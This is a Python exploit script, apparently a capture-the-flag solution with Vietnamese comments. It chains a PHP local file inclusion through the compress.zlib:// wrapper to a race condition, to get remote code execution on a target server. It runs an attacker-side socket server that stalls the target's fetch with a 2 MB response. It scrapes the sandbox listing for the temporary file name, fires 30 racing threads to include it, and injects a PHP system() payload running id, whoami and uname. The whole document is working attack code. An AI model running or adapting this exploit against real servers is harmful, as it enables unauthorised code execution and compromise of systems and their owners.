import socket
import threading
import time
import requests
import re
import os

TARGET_URL = "http://localhost:8080/"
SANDBOX_URL = "http://localhost:8080/sandbox/"
MY_IP = "172.17.0.1" 
MY_PORT = 8000

def run_exploit_chain(attempt):
    print(f" vòng thứ {attempt}...")
    found_file_event = threading.Event()

    def attacker_server():
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
        try:
            s.bind(('0.0.0.0', MY_PORT))
            s.listen(1)
            conn, addr = s.accept()
            conn.recv(1024)
            
            resp = b"HTTP/1.1 200 OK\r\nContent-Type: text/plain\r\n\r\n"
            resp += b"A" * (1024 * 1024 * 2) # làm stuck file_get_content
            conn.sendall(resp)
            
            #lấy tên file
            found_file_event.wait()
            
            # payload
            conn.sendall(b"\n<?php system('id; whoami; uname -a'); ?>\n")
            time.sleep(1)
            conn.close()
        except:
            pass
        finally:
            s.close()

    def trigger_lfi():
        lfi_url = f"{TARGET_URL}?file=compress.zlib://http://{MY_IP}:{MY_PORT}/"
        try:
            requests.get(lfi_url, timeout=3) 
        except:
            pass

    def fire_single_request(url):
        try:
            r = requests.get(url, timeout=2)
            if "uid=" in r.text:
                parts = r.text.split("uid=")
                if len(parts) > 1:
                    print("uid=" + parts[1].strip())
                os._exit(0)
        except:
            pass

    # khởi động
    t_server = threading.Thread(target=attacker_server)
    t_server.daemon = True
    t_server.start()
    
    t_trigger = threading.Thread(target=trigger_lfi)
    t_trigger.daemon = True
    t_trigger.start()
    
    time.sleep(0.5)
    
    try:
        r = requests.get(SANDBOX_URL, timeout=2)
        matches = re.findall(r'php[a-zA-Z0-9]{6}', r.text) # tìm tên file
        if not matches:
            return
            
        temp_file = matches[0]
        url = f"{TARGET_URL}?file=sandbox/{temp_file}"
        
        # mở 30 luồng để tăng xác suất
        threads = []
        for i in range(30):
            t = threading.Thread(target=fire_single_request, args=(url,))
            threads.append(t)
            t.start()
        
        found_file_event.set()
        
        for t in threads:
            t.join()
            
    except Exception:
        pass

if __name__ == "__main__":
    attempt = 1
    while True:
        run_exploit_chain(attempt)
        attempt += 1
        time.sleep(1) # Nghỉ 1 giây để server dọn dẹp file cũ